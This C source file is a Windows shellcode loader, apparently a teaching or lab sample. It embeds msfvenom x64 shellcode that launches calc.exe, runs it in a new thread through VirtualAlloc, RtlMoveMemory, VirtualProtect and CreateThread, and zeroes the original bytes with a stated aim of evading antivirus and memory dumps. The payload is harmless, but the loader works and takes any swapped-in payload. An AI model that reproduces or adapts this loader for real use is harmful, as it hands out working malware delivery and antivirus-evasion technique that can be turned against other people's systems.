#include <Windows.h>
#include <stdio.h>

// msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
// .data saved payload
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main() {

	printf("Current process ID: %d, press ENTER\n", GetCurrentProcessId());
	getchar();

	printf("memory address of the shellcode in the .data section: %p, press ENTER\n", shellcode);
	getchar();

	// setting the old protection variable to store the old protection of the memory region that will be changed to PAGE_EXECUTE_READWRITE
	DWORD dwOldProtection = 0;

	// allocate memory with PAGE_READWRITE permissions to write the shellcode
	LPVOID lpAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpAddress == NULL) {
		printf("VirtualAlloc a crash %d\n", GetLastError());
		return -1;
	}
	printf("allocated memory at %p, press ENTER\n", lpAddress);
	getchar();


	// copying the shellcode to the allocated memory
	RtlMoveMemory(lpAddress, shellcode, sizeof(shellcode));
	printf("shellcode copied to the memory at 0x%p, press ENTER\n", lpAddress);
	getchar();



	// zero out the original shellcode in the .data section to make it less detectable in memory dumps or by antivirus software
	memset((void*)shellcode, 0, sizeof(shellcode));
	printf("zeroed out the original shellcode in the .data section, press ENTER\n");
	getchar();


	// change the memory permission to EXECUTE_READ. RW, RX but not RWX
	DWORD dwOldProtect = 0;
	VirtualProtect(lpAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtection);
	printf("Memory protection changed to PAGE_EXECUTE_READ, press ENTER\n");
	getchar();


	// Create a thread (not the main thread) to execute the shellcode in the allocated memory and wait for the thread to finish (forever)
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAddress, NULL, 0, NULL);
	printf("Thread created, Handle: %p | TID: %lu\n", hThread, GetThreadId(hThread));	
	getchar();

	WaitForSingleObject(hThread, INFINITE); //wait foreverrr
	if (hThread == NULL) {
		printf("CreateThread a crash %d \n", GetLastError());
		return -1;
	}

	// free the allocated memory after the thread finishes executing the shellcode
	VirtualFree(lpAddress, 0, MEM_RELEASE);


	printf("Press <Enter> to quit");
	getchar();
	//quit
	return 0;
}